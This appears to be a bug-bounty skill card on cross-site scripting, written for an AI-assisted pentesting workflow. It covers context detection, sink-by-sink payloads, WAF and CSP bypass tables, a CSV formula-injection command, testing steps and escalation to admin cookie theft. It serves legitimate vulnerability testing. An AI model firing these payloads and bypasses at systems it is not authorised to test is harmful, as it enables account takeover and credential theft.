---
name: xss
description: XSS Light Deep Card — Context 识别 / 13 类 sink / WAF 绕过 / CSP 绕过 / Impact 升级路径。深度场景与历史链走 xss-scenarios.md,本文件是路由 + Triage 主入口。
category: vuln
tags: [client, xss, html-injection, dom-xss]
---

# XSS (Cross-Site Scripting) — Light Deep Card

> **CWE**: 79 / 80 / 87 | **OWASP**: A03:2021 (Injection) | **ROI**: 中-高 (P2-P3,链到接管 P0)
> **轻便原则**: 本文件路由 + 13 类 sink + 绕过 + Impact 链;深度 payload 库 / 场景 → [xss-scenarios.md](xss-scenarios.md)。

---

## 1. First-pass Signal (探测三件套)

| Payload | Context | 阳性信号 |
| :--- | :--- | :--- |
| `"><svg onload=alert(1)>` | HTML 主体 | 标签插入成功 / DOM 出现 svg |
| `'-alert(1)-'` | JS 字符串内 | JS 报错或弹窗 |
| `javascript:alert(1)` | href/src 属性 | 链接可点 / iframe 加载触发 |
| `{{7*7}}` `<%= 7*7 %>` | 模板引擎 | 返回 `49` → SSTI (路由 ssti.md) |

记录信号三要素: `HTTP_CODE` / `RESP_LENGTH_DELTA` / 反射位置 (HTML / JS / Attr / URL)。

**禁止**: 未确认反射点就跑 1000 个 payload 字典。先 Context 识别,再针对性测。

---

## 2. Attack Surface (常见入口)

| 入口类型 | 典型位置 | 例子 |
| :--- | :--- | :--- |
| **GET / POST 参数** | 搜索 / 提交表单 / API JSON | `?q=<script>` |
| **路径段** | RESTful URL | `/profile/<svg/onload=...>` |
| **Header** | User-Agent / Referer / X-Forwarded-For / Cookie | 反射在错误页或日志页 |
| **Hash (DOM)** | `#xxx` 被 JS 读 | `location.hash` → innerHTML |
| **postMessage** | 跨窗口通信 | `event.data` 未校验来源 |
| **WebSocket frame** | 实时聊天 / 通知 | 后端转发未转义 |
| **文件名 / Upload metadata** | EXIF / SVG / PDF | 渲染时执行 |
| **CSV 单元格** | Excel 公式 | `=cmd|'/c calc'!A0` |
| **第三方回调** | OAuth state / redirect_uri | URL 反射 |
| **Markdown 渲染** | 文档 / 评论 / Wiki | `<img onerror>` 在 markdown |
| **错误页 / 404 页** | URL 字段直接回显 | `/<svg onload=alert(1)>` |
| **管理后台日志查看** | Stored XSS 主战场 | UA / 操作记录 |

---

## 3. High-Value Targets (按 ROI 排)

1. **管理后台日志 / 用户列表查看页** → Stored XSS → 管理员 cookie / 接管 (P0)
2. **客服工单 / 用户反馈** → Stored XSS → 客服中招 → 内部系统 (P0/P1)
3. **聊天 / 评论 / 私信** → Stored XSS → 用户群批量 (P1)
4. **支付/订单备注** → 出现在审核员页面 → 内部接管 (P0)
5. **OAuth redirect_uri** → Open Redirect + XSS → 凭证窃取 (P1)
6. **postMessage 跨域信任** → 跨域 token 窃取 (P1)
7. **DOM Sink (innerHTML / eval / document.write)** → DOM XSS (P2)
8. **错误页/404 反射** → 钓鱼 / 1-click (P2-P3)

---

## 4. Context 识别 — 决策树

```
反射出现 → 看周围 5 字符 → 决定 Context:
  ├─ 在 <tag>HERE</tag> 之间 → HTML Body Context → §5.A
  ├─ 在 <tag attr="HERE"> 内 → Attribute Context → §5.B  
  ├─ 在 <script>HERE</script> 内 → JS Context → §5.C
  ├─ 在 <a href="HERE"> URL 位置 → URL Context → §5.D
  ├─ 在 <style>HERE</style> 内 → CSS Context → §5.E
  ├─ JSON 响应在 <script type="application/json"> → JSON-in-Script → §5.F
  └─ 完全不在 HTML 里 (纯 JSON API) → 看是否被 JS 读取 → §5.G DOM
```

---

## 5. Sink 分类 + 对应 Payload 思路

### 5.A HTML Body

```
"><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
"><iframe src=javascript:alert(1)>
"><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">
```

被过滤 `<` `>` 但 `"` `'` 没过 → 看 §5.B 属性内突破。

### 5.B Attribute

```
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
' onerror=alert(1) src='x
```

被引号截断后,通过 event handler 触发。注意被过滤 `=` `(` 时用编码绕过。

### 5.C JS 内

```
'-alert(1)-'
';alert(1);//
\'-alert(1)-\'    # 引号被转义时
${alert(1)}        # 模板字符串
```

### 5.D URL (href/src)

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:alert(1)
```

某些场景 `javascript:` 被过滤 → 试 `JaVaScRiPt:` / `java\tscript:` / 编码。

### 5.E CSS

```
expression(alert(1))      # IE 老
background:url(javascript:alert(1))
@import "javascript:alert(1)"
```

### 5.F JSON-in-Script (页面内嵌 JSON)

```
</script><script>alert(1)</script>
```

JSON 内反射时直接闭 script 标签。

### 5.G DOM XSS

抓 DOM sink: `innerHTML` / `outerHTML` / `document.write` / `eval` / `setTimeout(str)` / `Function(str)` / `location.href=` / `jQuery.html()`。

抓 source: `location.hash` / `location.search` / `document.URL` / `document.referrer` / `window.name` / `localStorage` / `postMessage`。

测试: source → sink 路径找到后,构造 payload 走 source 注入。

---

## 6. Bypass Techniques (WAF / 过滤绕过)

| 过滤 | 绕过 |
| :--- | :--- |
| 拦 `<script>` | 用其他事件标签: `<svg onload>` / `<img onerror>` / `<body onpageshow>` |
| 拦 `script` 字符串 | 大小写 `ScRipT` / 注释 `scr<!---->ipt` / 编码 `\x73cript` |
| 拦 `alert` | 用 `confirm` / `prompt` / `print` / `eval("ale"+"rt(1)")` |
| 拦 `on*` event | 试 SVG 内嵌 `<svg><script>` / 试 `onpointerdown` 等冷门事件 |
| 拦 `=` | 用 `=` / `&#x3d;` 编码 |
| 拦 `(` / `)` | 用 `(` / 反引号 `\`alert\`(1)` |
| 拦 `"` `'` | 用 `${...}` 模板字符串 / Backtick |
| WAF 字符串长度限制 | 短 payload `<svg/onload=alert(1)>` (空格用 `/`) |
| 双重 URL 编码 | `%253Cscript%253E` |
| Unicode 同形 | `＜script＞` (全角) |

### 6.1 CSP 绕过

| CSP 配置 | 绕过 |
| :--- | :--- |
| `unsafe-inline` 缺失,但有白名单 | 找白名单域的 JSONP endpoint |
| `script-src 'self'` | 找站内 文件上传 → 上传 .js |
| `script-src https://cdn.example.com` | CDN 上的开放 JSONP / Angular template |
| Strict CSP + nonce | 难,看是否 nonce 重用或预测 |
| `script-src *` | 直接外部 JS |

---

## 7. Testing Methodology (Phase 2 步骤)

```bash
# Step 1: 反射检测 (探所有参数)
# 用 unique token,避免误判
TOKEN="xssfp${RANDOM}"
curl -s "https://target/page?q=$TOKEN" | grep -oE ".{10}$TOKEN.{10}"
# 看 token 在响应的什么位置

# Step 2: Context 识别 (按 §4 决策树)

# Step 3: 针对性 payload 试探 (按 §5)

# Step 4: WAF 探测
# 先发常见 payload,看 403/封禁
# 再按 §6 绕过

# Step 5: Stored XSS 测试 (Phase 2 必跑)
# 提交点 → 查看点 链路打通
# 注意查看点可能是不同账号 (admin/客服等)

# Step 6: DOM XSS 测试
# JS 源码 / 浏览器 DevTools "Sources" 搜 source/sink

# Step 7: CSRF + XSS 组合 (Stored XSS 升级)
# 如果有 CSRF 漏洞,可帮触发 stored XSS
```

---

## 8. Triage (现象 → 下一步)

| 现象 | 可能原因 | 下一步 |
| :--- | :--- | :--- |
| 403 Forbidden | WAF 拦 `<script>` | §6 绕过表,先试大小写 / 事件标签替换 |
| 200 但 `<` `>` 被转义 `&lt;` | `htmlspecialchars` 转义 | 找其他非转义上下文 (JSON / Attribute) / 测 `"` 是否过 |
| 200 但 `"` `'` 都过 | 强转义 | 试 backtick `\`` / Unicode `＜` 全角 |
| 反射在 `<script>` 内但弹不了 | 字符串闭合问题 | 试 `\'-alert(1)-\'` / 看是否被 `\\` 转义 |
| 反射在 attribute 内但无事件 | event handler 被过滤 | 试 `autofocus onfocus` 隐式触发 / `<img src=x onerror>` 替换标签 |
| Stored 提交成功但未触发 | 查看点不同账号 | 切到管理后台账号看 / 客服账号看 |
| 任意 payload 都不弹 | DOM sink 不存在 / JS 沙箱 | 转 CSRF / Open Redirect / 其他客户端漏洞 |

---

## 9. False Positives

### 9.0 SRC 输出点转向与评级边界

| 入口信号 | 失败现象 | 转向动作 | 关键证据 | 评级边界 | 误判过滤 |
|---|---|---|---|---|---|
| 富文本/需求/工单/审核 | 提交接口过滤 | 转保存草稿、预览、暂存、历史详情 | 服务端保存值、输出页面、触达角色 | 自触发低; 普通跨用户中; 高权限后台触达且有敏感影响才高 | 保存成功不等于触发成功 |
| 页面刷新后内容净化 | 前端渲染值被过滤 | 查 API 查询、移动端、WebView、审核后台输出 | API 原始字段与目标端解释/触发证据 | 目标角色和业务影响决定评级 | 只在当前用户页面显示不算高危 |
| 常规 payload 失败 | 标签/事件被过滤 | 转图片、链接、附件、Markdown、客服/管理员查看点 | 目标端触发和最小化业务影响 | 后台会话/敏感操作影响才有高危空间 | 不继续堆无意义 payload 或外带截图 |

| 误报场景 | 真实判断 |
| :--- | :--- |
| Burp Active Scan 报 reflected XSS,手测无法弹 | 多半是过滤后字符串相似但已 sanitize,看具体响应 |
| `<svg onload>` 不弹但浏览器 console 报 CSP | 是 XSS 但被 CSP 挡住 — 改报 medium + CSP-bypass 链 |
| 反射出现但没有特殊字符可用 | 不是 XSS,可能只是 Open Redirect / HTML injection |
| Stored 成功但只对自己可见 | 不是 stored XSS,只是 self-XSS — 低危,需配 CSRF/social |
| 测试时是 GET 反射,但页面是 POST 提交 | 老 POST→GET 转换可能存在 (CSRF 触发) |

---

## 10. Impact / 升级路径

| 链 | 终态 | Impact |
| :--- | :--- | :--- |
| Stored XSS in admin log | 管理员 cookie / CSRF Token 窃取 → 提权 | Critical |
| Reflected XSS + Open Redirect | 钓鱼 + 凭证窃取 | High |
| DOM XSS + sensitive token in URL | Token 窃取 | High |
| Self-XSS + CSRF | 升级为有效 XSS (诱骗用户) | Medium-High |
| postMessage Source 信任 | 跨域 token 窃取 | High |
| Stored XSS in user-visible field | 1 用户被攻击 → 蠕虫式传播 | Critical |

**证据**: P3.5 协议下,**不要**真的执行 `document.cookie` 然后发到攻击者域;用 `alert(document.domain)` 证明执行能力即可。如需证明 cookie 窃取,HITL 跟用户确认是否提供 OOB 通道。

---

## 11. Pro Tips

- **反射点定位优先用唯一 token** (`xssfp${RANDOM}`),避免 grep 出无关响应
- **Phase 1 时 JS 文件爬全** — 大型站的 DOM XSS 主战场是 SPA 应用,Burp 抓不到全部 fetch
- **Stored XSS 真正高危场景**: 管理后台日志 / 客服 / 审核 — 不要光测自己可见的评论
- **CSP `report-uri` 信息泄露**: 浏览器把 CSP 违规上报到 endpoint,可能含敏感 URL — 看 CSP 报告地址
- **微信小程序内的 H5 (web-view)**: XSS 可能能调小程序原生 API (`wx.miniProgram.*`) → 高 impact
- **markdown XSS 常被忽略**: `<img onerror>` 在 markdown 渲染时常通过
- **Self-XSS 不要轻易报告** — 单独是 Low,需配 CSRF/social 才有意义
- **CSP 检测先于 payload**: `Content-Security-Policy` Header 先看,**有 strict-dynamic + nonce** 直接放弃常规 XSS,转 logic bug
- **国内 WAF (云盾/腾讯云)**: 拦截 keyword,试 `pseudo-protocol` 类: `data:text/html;base64,...`

---

## 12. 工具升级线

**classic 版**:
- 自动化扫: `XSStrike` / `Dalfox`
- 浏览器测试: 手开 DevTools / Burp Suite Scanner
- Payload 库: PayloadsAllTheThings / SecLists

**toolPlus 版**:
- `mcp__yaklang__http_fuzzer` + `xss-payload` 字典一次 sweep
- `mcp__chrome__chrome_navigate` + `evaluate_script` 自动验证 payload 执行
- `mcp__chrome__chrome_screenshot` 自动归档弹窗证据
- `mcp__yaklang__ssa_compile language="js"` + SyntaxFlow 找 DOM source/sink

---

## 13. 相关参考

- 深度场景与历史链: [xss-scenarios.md](xss-scenarios.md)
- Payload 构造思路: [../payload-construction/xss-construction.md](../payload-construction/xss-construction.md)
- DOM 相关 / postMessage / CORS: [cors-cache.md](cors-cache.md)
- CSRF (与 XSS 互链): [csrf-clickjacking.md](csrf-clickjacking.md)
- SSTI (模板注入,与 XSS 路由邻接): [ssti.md](ssti.md)
- WAF 绕过通用: [../waf-bypass.md](../waf-bypass.md)
- 直觉触发: [../intuition-triggers.md](../intuition-triggers.md)
- 报告模板: [../report-template.md](../report-template.md)
